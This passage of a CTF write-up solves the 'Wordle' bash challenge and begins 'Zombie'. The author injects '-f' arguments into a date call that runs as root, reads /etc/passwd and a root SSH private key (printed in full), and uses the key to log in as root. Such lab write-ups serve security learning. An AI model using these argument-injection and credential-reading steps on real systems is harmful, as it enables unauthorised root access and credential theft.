</span></span><span class="line"><span class="cl"><span class="nv">YEAR</span><span class="o">=</span><span class="si">${</span><span class="nv">YEARS</span><span class="p">[</span><span class="nv">$YEARS_INDEX</span><span class="p">]</span><span class="si">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">MONTHS_SIZE</span><span class="o">=</span><span class="si">${#</span><span class="nv">MONTHS</span><span class="p">[@]</span><span class="si">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">MONTHS_INDEX</span><span class="o">=</span><span class="k">$((</span><span class="nv">$RANDOM</span> <span class="o">%</span> <span class="nv">$MONTHS_SIZE</span><span class="k">))</span>
</span></span><span class="line"><span class="cl"><span class="nv">MONTH</span><span class="o">=</span><span class="si">${</span><span class="nv">MONTHS</span><span class="p">[</span><span class="nv">$MONTHS_INDEX</span><span class="p">]</span><span class="si">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">DAYS_SIZE</span><span class="o">=</span><span class="si">${#</span><span class="nv">DAYS</span><span class="p">[@]</span><span class="si">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">DAYS_INDEX</span><span class="o">=</span><span class="k">$((</span><span class="nv">$RANDOM</span> <span class="o">%</span> <span class="nv">$DAYS_SIZE</span><span class="k">))</span>
</span></span><span class="line"><span class="cl"><span class="nv">DAY</span><span class="o">=</span><span class="si">${</span><span class="nv">DAYS</span><span class="p">[</span><span class="nv">$DAYS_INDEX</span><span class="p">]</span><span class="si">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">TARGET_DATE</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">YEAR</span><span class="si">}</span><span class="s2">-</span><span class="si">${</span><span class="nv">MONTH</span><span class="si">}</span><span class="s2">-</span><span class="si">${</span><span class="nv">DAY</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">gum style <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  --foreground <span class="m">212</span> --border-foreground <span class="m">212</span> --border double <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  --align center --width <span class="m">50</span> --margin <span class="s2">&#34;1 2&#34;</span> --padding <span class="s2">&#34;2 4&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  <span class="s1">&#39;WORDLE DATE&#39;</span> <span class="s1">&#39;Uncover the correct date!&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;We&#39;ve selected a random date, and it&#39;s up to you to guess it!&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">wordle_attempts</span><span class="o">=</span><span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="o">[</span> <span class="nv">$wordle_attempts</span> -le <span class="m">5</span> <span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="k">do</span>
</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> <span class="s2">&#34;Attempt </span><span class="nv">$wordle_attempts</span><span class="s2">:&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> <span class="s2">&#34;Please select the year you think we&#39;ve chosen:&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">chosen_year</span><span class="o">=</span><span class="k">$(</span>gum choose <span class="si">${</span><span class="nv">YEARS</span><span class="p">[@]</span><span class="si">}</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> <span class="s2">&#34;Now, enter the month of your guess: &#34;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">chosen_month</span><span class="o">=</span><span class="k">$(</span>gum choose <span class="si">${</span><span class="nv">MONTHS</span><span class="p">[@]</span><span class="si">}</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> <span class="s2">&#34;Finally, enter the day of your guess: &#34;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">chosen_day</span><span class="o">=</span><span class="k">$(</span>gum choose <span class="si">${</span><span class="nv">DAYS</span><span class="p">[@]</span><span class="si">}</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="nv">guess_date</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$chosen_year</span><span class="s2">-</span><span class="nv">$chosen_month</span><span class="s2">-</span><span class="nv">$chosen_day</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="k">if</span> ! date -d <span class="nv">$guess_date</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Invalid date! Your guess must be a valid date in the format YYYY-MM-DD.&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span>
</span></span><span class="line"><span class="cl">  <span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nv">confirmed</span><span class="o">=</span><span class="m">1</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="o">[</span> <span class="nv">$confirmed</span> -ne <span class="m">0</span> <span class="o">]</span>
</span></span><span class="line"><span class="cl">  <span class="k">do</span>
</span></span><span class="line"><span class="cl">    gum confirm <span class="s2">&#34;You&#39;ve entered &#39;</span><span class="nv">$guess_date</span><span class="s2">&#39;. Is that right?&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">confirmed</span><span class="o">=</span><span class="nv">$?</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[[</span> <span class="nv">$confirmed</span> -eq <span class="m">0</span> <span class="o">]]</span>
</span></span><span class="line"><span class="cl">    <span class="k">then</span>
</span></span><span class="line"><span class="cl">      <span class="nb">break</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Please select the date you meant:&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">guess_date</span><span class="o">=</span><span class="k">$(</span>gum input --placeholder <span class="nv">$guess_date</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">  <span class="k">done</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="o">[[</span> <span class="k">$(</span>date <span class="nv">$guess_date</span><span class="k">)</span> <span class="o">==</span> <span class="k">$(</span>date -d <span class="nv">$TARGET_DATE</span> +%Y-%m-%d<span class="k">)</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    gum style <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>      --foreground <span class="m">212</span> --border-foreground <span class="m">212</span> --border double <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>      --align center --width <span class="m">50</span> --margin <span class="s2">&#34;1 2&#34;</span> --padding <span class="s2">&#34;2 4&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>      <span class="s2">&#34;Congratulations, you&#39;ve won! You correctly guessed the date!&#34;</span> <span class="s1">&#39;Your flag is:&#39;</span> <span class="k">$(</span>cat /root/flag.txt<span class="k">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Sorry, that wasn&#39;t correct!&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;=====================================&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nv">wordle_attempts</span><span class="o">=</span><span class="k">$((</span>wordle_attempts+1<span class="k">))</span>
</span></span><span class="line"><span class="cl"><span class="k">done</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">gum style <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  --foreground <span class="m">212</span> --border-foreground <span class="m">212</span> --border double <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  --align center --width <span class="m">50</span> --margin <span class="s2">&#34;1 2&#34;</span> --padding <span class="s2">&#34;2 4&#34;</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>  <span class="s2">&#34;Sorry, you lost.&#34;</span> <span class="s2">&#34;The correct date was </span><span class="nv">$TARGET_DATE</span><span class="s2">.&#34;</span>
</span></span></code></pre></div><p>We can see the dates are generated &ldquo;randomly&rdquo; upon launch, so my first thought is to run 2 instances simultaneously. If the dates can match up, then it will be an easy win:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@wordle:~$ ./wordle_bash.sh <span class="p">&amp;</span> ./wordle_bash.sh
</span></span></code></pre></div><p>It works as expected, but I hadn&rsquo;t considered that in order to see the flag it had to be run as sudo. A quick check on sudo privs shows me that I am indeed capable:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@wordle:~$ sudo -l
</span></span><span class="line"><span class="cl">&lt;... SNIP ...&gt;
</span></span><span class="line"><span class="cl">User user may run the following commands on wordle-bash-d18d8fe5e302e98a-89966b69d-lv5gw:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> /home/user/wordle_bash.sh
</span></span></code></pre></div><p>However, running 2 sudo instances became very problematic, as I am asked for password on every launch. If one sudo process is immediately sent to <code>bg</code>, it will fail to launch once i try to <code>fg</code>, since the password had not really been submitted.</p>
<p>After spending too long on trying to run 2 processes simultaneously, I looked more thoroughly at the userinput we could control. I noticed that after selecting dates, you are asked confirmation. If you say no, you can supply your own input with interesting results:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Please <span class="k">select</span> the date you meant:
</span></span><span class="line"><span class="cl">                                                          
</span></span><span class="line"><span class="cl">You<span class="s1">&#39;ve entered &#39;</span>-d <span class="nv">$TARGET_DATE</span> +%Y-%m-%d<span class="s1">&#39;. Is that right?
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘$TARGET_DATE’
</span></span></span><span class="line"><span class="cl"><span class="s1">Sorry, that wasn&#39;</span>t correct!
</span></span></code></pre></div><p>The <code>date</code> function seems to be recognizing the -d flag without issue? Perhaps we are able to provide our own arguments to execute.</p>
<p>The <a href="https://gtfobins.github.io/gtfobins/date/">GTFObins</a> site has a page for <code>date</code>; we might be able to utilize arbitrary read capabilities.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Please <span class="k">select</span> the date you meant:
</span></span><span class="line"><span class="cl">                                               
</span></span><span class="line"><span class="cl">You<span class="s1">&#39;ve entered &#39;</span>-f /etc/passwd<span class="s1">&#39;. Is that right?
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘root❌0:0:root:/root:/bin/bash’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘bin❌1:1:bin:/bin:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘daemon❌2:2:daemon:/sbin:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘adm❌3:4:adm:/var/adm:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘lp❌4:7:lp:/var/spool/lpd:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘sync❌5:0:sync:/sbin:/bin/sync’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘shutdown❌6:0:shutdown:/sbin:/sbin/shutdown’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘halt❌7:0:halt:/sbin:/sbin/halt’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘mail❌8:12:mail:/var/mail:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘news❌9:13:news:/usr/lib/news:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘uucp❌10:14:uucp:/var/spool/uucppublic:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘operator❌11:0:operator:/root:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘man❌13:15:man:/usr/man:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘postmaster❌14:12:postmaster:/var/mail:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘cron❌16:16:cron:/var/spool/cron:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘ftp❌21:21::/var/lib/ftp:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘sshd❌22:22:sshd:/dev/null:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘at❌25:25:at:/var/spool/cron/atjobs:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘squid❌31:31:Squid:/var/cache/squid:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘xfs❌33:33:X Font Server:/etc/X11/fs:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘games❌35:35:games:/usr/games:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘cyrus❌85:12::/usr/cyrus:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘vpopmail❌89:89::/var/vpopmail:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘ntp❌123:123:NTP:/var/empty:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘smmsp❌209:209:smmsp:/var/spool/mqueue:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘guest❌405💯guest:/dev/null:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘nobody❌65534:65534:nobody:/:/sbin/nologin’
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘user❌1000:1000:Linux User,,,:/home/user:/home/user/.user-entrypoint.sh’
</span></span></span><span class="line"><span class="cl"><span class="s1">Sorry, that wasn&#39;</span>t correct!
</span></span></code></pre></div><p>With arbitrary read, we should be able to display the contents of the flag.txt as well!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Please <span class="k">select</span> the date you meant:
</span></span><span class="line"><span class="cl">                                                  
</span></span><span class="line"><span class="cl">You<span class="s1">&#39;ve entered &#39;</span>-f /root/flag.txt<span class="s1">&#39;. Is that right?
</span></span></span><span class="line"><span class="cl"><span class="s1">date: invalid date ‘[ Sorry, your flag will be displayed once you have code execution as root ]’
</span></span></span><span class="line"><span class="cl"><span class="s1">Sorry, that wasn&#39;</span>t correct!
</span></span></code></pre></div><p>Unexpectedly, it looks like flag.txt was a bait after all. It says we must have code execution as root for the flag, but I thought perhaps I can &ldquo;guess&rdquo; the name of the flag file using wildcards:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Please <span class="k">select</span> the date you meant:
</span></span><span class="line"><span class="cl">                                           
</span></span><span class="line"><span class="cl">You<span class="s1">&#39;ve entered &#39;</span>-f /root/*<span class="s1">&#39;. Is that right?
</span></span></span><span class="line"><span class="cl"><span class="s1">date: the argument ‘/root/get_flag_random_suffix_345674837560870345’ lacks a leading &#39;</span>+<span class="s1">&#39;;
</span></span></span><span class="line"><span class="cl"><span class="s1">when using an option to specify date(s), any non-option
</span></span></span><span class="line"><span class="cl"><span class="s1">argument must be a format string beginning with &#39;</span>+<span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">Try &#39;</span>date --help<span class="s1">&#39; for more information.
</span></span></span><span class="line"><span class="cl"><span class="s1">Sorry, that wasn&#39;</span>t correct!
</span></span></code></pre></div><p>We find an interesting file name. Once more, using exactly this name:</p>
<pre tabindex="0"><code>Wed Jan  1 00:00:00 UTC 2020
Please select the date you meant:
                                                                                   
You&#39;ve entered &#39;-f /root/get_flag_random_suffix_345674837560870345&#39;. Is that right?
date: invalid date ‘\177ELF\002\001\001’
date: invalid date ‘:’
date: invalid date ‘.\001?\031\003\016:\v;\v9\vI\023&lt;\031\001\023’
Sorry, that wasn&#39;t correct!
</code></pre><p>This is a binary executable, likely containing our flag once we execute as root. So, clearly, we do indeed need code execution as root.</p>
<p>Eventually, I thought to look for ssh keys in <code>/root/.ssh/id_rsa</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">date: invalid date ‘-----BEGIN OPENSSH PRIVATE KEY-----’
</span></span><span class="line"><span class="cl">date: invalid date ‘b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn’
</span></span><span class="line"><span class="cl">date: invalid date ‘NhAAAAAwEAAQAAAYEAxllMaPu/ewDglK/+qcskWbUTSiQtLBBX4Ls5EGWmGbTdKh7K7trC’
</span></span><span class="line"><span class="cl">date: invalid date ‘Nht9hbSx8Ei4cLQWhbbwcvIqDAgrXYO9Vb/sr/BEyk1aVVTpFfLuFbsyZNZTqmONajdsf9’
</span></span><span class="line"><span class="cl">date: invalid date ‘Kl/4Qy9u8/3duhBYaeV0Am4tK9mzM8/D2YbzmYD+pK8GFwJDQG5RdFstj6NxXjROAsaj8H’
</span></span><span class="line"><span class="cl">date: invalid date ‘U7HHvkNFctEMMBmquAaG85DZO83ZUWWASB702UNrc701Mhdf7Ln92D2aEhwMisdBjK/F83’
</span></span><span class="line"><span class="cl">date: invalid date ‘K71YIcrpkuDTQYhms4SGUlYIlUaIhridKH3m3BgCNhC5mjsy5IkV0VwG/SRxew0adhHxT+’
</span></span><span class="line"><span class="cl">date: invalid date ‘Gc9izi2yy1uW1wrJT0u8ImQhTm35R+cLD+SpWJSHswDxygCVHTUvVIngNakJvWXRKDmS3N’
</span></span><span class="line"><span class="cl">date: invalid date ‘PjIu9gaJ3D69Q3BDlxcbluhjl2Z/5nenryUZdoVORnCf75YiWgTtI/FhS7HnHyw69LaJoH’
</span></span><span class="line"><span class="cl">date: invalid date ‘1NPGh/mV730OsnqtdakxkHXd3CDhcwY5QjvJlFEdAAAFgAlNDvEJTQ7xAAAAB3NzaC1yc2’
</span></span><span class="line"><span class="cl">date: invalid date ‘EAAAGBAMZZTGj7v3sA4JSv/qnLJFm1E0okLSwQV+C7ORBlphm03Soeyu7awjYbfYW0sfBI’
</span></span><span class="line"><span class="cl">date: invalid date ‘uHC0FoW28HLyKgwIK12DvVW/7K/wRMpNWlVU6RXy7hW7MmTWU6pjjWo3bH/Spf+EMvbvP9’
</span></span><span class="line"><span class="cl">date: invalid date ‘3boQWGnldAJuLSvZszPPw9mG85mA/qSvBhcCQ0BuUXRbLY+jcV40TgLGo/B1Oxx75DRXLR’
</span></span><span class="line"><span class="cl">date: invalid date ‘DDAZqrgGhvOQ2TvN2VFlgEge9NlDa3O9NTIXX+y5/dg9mhIcDIrHQYyvxfNyu9WCHK6ZLg’
</span></span><span class="line"><span class="cl">date: invalid date ‘00GIZrOEhlJWCJVGiIa4nSh95twYAjYQuZo7MuSJFdFcBv0kcXsNGnYR8U/hnPYs4tsstb’
</span></span><span class="line"><span class="cl">date: invalid date ‘ltcKyU9LvCJkIU5t+UfnCw/kqViUh7MA8coAlR01L1SJ4DWpCb1l0Sg5ktzT4yLvYGidw+’
</span></span><span class="line"><span class="cl">date: invalid date ‘vUNwQ5cXG5boY5dmf+Z3p68lGXaFTkZwn++WIloE7SPxYUux5x8sOvS2iaB9TTxof5le99’
</span></span><span class="line"><span class="cl">date: invalid date ‘DrJ6rXWpMZB13dwg4XMGOUI7yZRRHQAAAAMBAAEAAAGAECAzdPeUCOaN264hU2Gcz3RIIL’
</span></span><span class="line"><span class="cl">date: invalid date ‘InQAVbd6hmX8hmhCwvAkfQR4dehx1ItmWgmoChtNFXYWtO9NwZAghp/3zV7aegZmoaKvkL’
</span></span><span class="line"><span class="cl">date: invalid date ‘UT5e2DYmGCXeLNI7VBzVjZ9QQWYkBng+LShPYMoEjIP2J0bObTN6pH26cBF77VMD42Cw01’
</span></span><span class="line"><span class="cl">date: invalid date ‘vrTO4z6ffbO/VQW8kk7zUV4f9vfjpJGyqx9enmsURs8PA1lDjLCIXYV2Sb/4EQzAHOCxyv’
</span></span><span class="line"><span class="cl">date: invalid date ‘Zfv+LwCsvCIUqXNBVnO+N7hg5b/zh7gyvuzHq/vyOTjkNceQa7SZ/egeclWGkkYttUzUr1’
</span></span><span class="line"><span class="cl">date: invalid date ‘0cveVqXTM2tfJhv8+cobJcmO7IccjsOyL+zYPR3mN/Q1nUvGyAERppXfhwTAZ5ljMRDkv/’
</span></span><span class="line"><span class="cl">date: invalid date ‘KUy7IJ3Q9FnSVdqkni2u6ErHEer0/TKXAT92LYQXzTczd6hGvh+IADlmOLzU2d0RfkPZZ4’
</span></span><span class="line"><span class="cl">date: invalid date ‘8GKvZfThN1OSMVpcwJMVeILWP6uz9WnnUAXgLIUriJK7rrsHpH0MNTmfTT9v5VSH3RAAAA’
</span></span><span class="line"><span class="cl">date: invalid date ‘wB2od8rr4IU8AkpZ/kE9kY5a/INNsvSdUA6sn/5Fwso19fiPz2vYdP9fJMYjShV1wb8UFt’
</span></span><span class="line"><span class="cl">date: invalid date ‘cajFvnnj2DnClU0imh1eC0fB5+vAmJvx8Qq9NWcmz7aejvZrBdIFbqGYr5krc5KvmizYVC’
</span></span><span class="line"><span class="cl">date: invalid date ‘+tII4u4s5SFcvcZwmuIsWJQjbXA7VVa8v8Y10YJdeYsl3YpKqJdU0xPkt2Y2IgZxTJ4Dd9’
</span></span><span class="line"><span class="cl">date: invalid date ‘MKgcPTBdOVuKA8r8ALCth9OV74k1GOEpLbDIY4gFiXbi7crQAAAMEA2Z0ZtNS6bUEq61DF’
</span></span><span class="line"><span class="cl">date: invalid date ‘6758uI3wIeYe8NoGyxlH/oTGVqy5KfQ9vCochcSx0yov4MSZBY+foE8OAxNvAxBSV+2CnQ’
</span></span><span class="line"><span class="cl">date: invalid date ‘4OHnZnKa9teSvphUCmnt4Va7CWRzmVmNiKlpMOky2P8Zfv3LdgpwrAbwxBL1HQv/eivXDm’
</span></span><span class="line"><span class="cl">date: invalid date ‘0BQCxuiaOp5/3nz+K+IvA/cBhsJwS6bWMtAhcfzKfS7/NzgcLTtlVR1Li/vC/r69iDs/xi’
</span></span><span class="line"><span class="cl">date: invalid date ‘zDGCjuOrjsWhqqIqjhMGZjguTz9Y+FAAAAwQDpVj6g1OSqzZ5Kw805VTcbRRTmiHb00hht’
</span></span><span class="line"><span class="cl">date: invalid date ‘U4LYw5xV+1iNJ8/BijiIZaT/zXnZbzIzLBnPbzqNLW5sBPJ+eMo5wY5ZNKa/qMd4Rdj6Hx’
</span></span><span class="line"><span class="cl">date: invalid date ‘pAVbuqv6sYPhj2Xl6R/yJUVRw6OGoIa0SEumrmXzbJTT25o9FgItuKOpRRWd9l4gB8Pa1I’
</span></span><span class="line"><span class="cl">date: invalid date ‘LLomZzqAmpdZtcMX+ihYPAJL5UBGPkD4CO7JwHm+W36NpAEKhi/Fh6D/U/RPEtwXZEbaWY’
</span></span><span class="line"><span class="cl">date: invalid date ‘vIJis7FbO7UrkAAAAJa2FsaUBrYWxpAQI<span class="o">=</span>’
</span></span><span class="line"><span class="cl">date: invalid date ‘-----END OPENSSH PRIVATE KEY-----’
</span></span><span class="line"><span class="cl">Sorry, that wasn<span class="err">&#39;</span>t correct!
</span></span></code></pre></div><p>Very nicely, the whole key is here. from this point it&rsquo;s a matter of creating the cleaned id_rsa file and using it to ssh as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ssh -p <span class="m">32726</span> -i id_rsa root@challenge.nahamcon.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">root@wordle:~# <span class="nb">cd</span> /root
</span></span><span class="line"><span class="cl">root@wordle:~# ls
</span></span><span class="line"><span class="cl">flag.txt  get_flag_random_suffix_345674837560870345
</span></span><span class="line"><span class="cl">root@wordle:~# ./get_flag_random_suffix_345674837560870345 
</span></span><span class="line"><span class="cl">Please press Enter within one second to retrieve the flag.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">flag<span class="o">{</span>2b9576d1a7a631b8ce12595f80f3aba5<span class="o">}</span>
</span></span></code></pre></div><p>There is even the extra precaution of needing to press Enter after running in order to retrieve the password. They were quite thorough in wanting you to have execution as root.</p>
<p><code>flag{2b9576d1a7a631b8ce12595f80f3aba5}</code></p>
<h3 id="zombie">Zombie</h3>
<blockquote>
<p>Author: @JohnHammond#6971</p>
<p>Oh, shoot, I could have sworn there was a flag here. Maybe it&rsquo;s still alive out there?</p>
</blockquote>
<hr>
<p>Logging in, we see an interesting .user-entrypoint.sh file:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@zombie:~$ ls -al
</span></span><span class="line"><span class="cl">total <span class="m">24</span>
</span></span><span class="line"><span class="cl">drwxr-sr-x    <span class="m">1</span> user     user          <span class="m">4096</span> Jun <span class="m">15</span> 22:23 .
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">1</span> root     root          <span class="m">4096</span> Jun <span class="m">14</span> 17:52 ..
</span></span><span class="line"><span class="cl">-rwxr-xr-x    <span class="m">1</span> user     user          <span class="m">3846</span> Jun <span class="m">14</span> 17:52 .bashrc
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> user     user            <span class="m">17</span> Jun <span class="m">14</span> 17:52 .profile
</span></span><span class="line"><span class="cl">-rwxr-xr-x    <span class="m">1</span> root     root           <span class="m">131</span> Jun <span class="m">14</span> 17:52 .user-entrypoint.sh
</span></span></code></pre></div><p>the contents:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@zombie:~$ cat ~/.user-entrypoint.sh 
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">nohup tail -f /home/user/flag.txt &gt;/dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span> <span class="c1"># </span>
</span></span><span class="line"><span class="cl"><span class="nb">disown</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">rm -f /home/user/flag.txt 2&gt;<span class="p">&amp;</span><span class="m">1</span> &gt;/dev/null
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">bash -i
</span></span></code></pre></div><p>This looks like something that might be run upon entry. Just to check we can see our default terminal in <code>/etc/passwd</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@zombie:~$ cat /etc/passwd <span class="p">|</span> grep user
</span></span><span class="line"><span class="cl">user❌1000:1000:Linux User,,,:/home/user:/home/user/.user-entrypoint.sh
</span></span></code></pre></div><p>Looks like this did indeed run and we can see very clearly the <code>rm</code> function getting rid of the flag. oops.
Also notable is the <code>tail -f</code> . The -f flag is a live following, or reading the final lines of the file.  We can also see a trailing &amp;, meaning this has been set to background. As for <code>nohup</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nohup
</span></span><span class="line"><span class="cl">BusyBox v1.27.2 <span class="o">(</span>2018-06-06 09:08:44 UTC<span class="o">)</span> multi-call binary.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Usage: nohup PROG ARGS
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Run PROG immune to hangups, with output to a non-tty
</span></span></code></pre></div><p>We can see this prevents accidental closings. This process is likely still running.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@zombie:~$ ps
</span></span><span class="line"><span class="cl">PID   USER     TIME   COMMAND
</span></span><span class="line"><span class="cl">    <span class="m">1</span> root       0:00 /usr/sbin/sshd -D -e
</span></span><span class="line"><span class="cl">    <span class="m">7</span> root       0:00 sshd: user <span class="o">[</span>priv<span class="o">]</span>
</span></span><span class="line"><span class="cl">    <span class="m">9</span> user       0:00 sshd: user@pts/0
</span></span><span class="line"><span class="cl">   <span class="m">10</span> user       0:00 <span class="o">{</span>.user-entrypoin<span class="o">}</span> /bin/bash /home/user/.user-entrypoint.sh -c bash
</span></span><span class="line"><span class="cl">   <span class="m">11</span> user       0:00 tail -f /home/user/flag.txt
</span></span><span class="line"><span class="cl">   <span class="m">13</span> user       0:00 bash -i
</span></span><span class="line"><span class="cl">   <span class="m">18</span> user       0:00 bash
</span></span><span class="line"><span class="cl">   <span class="m">25</span> user       0:00 ps
</span></span></code></pre></div><p>We do indeed see this process still running with a PID 11. My thinking is perhaps we can see the contents by exploring the PID in /proc/</p>
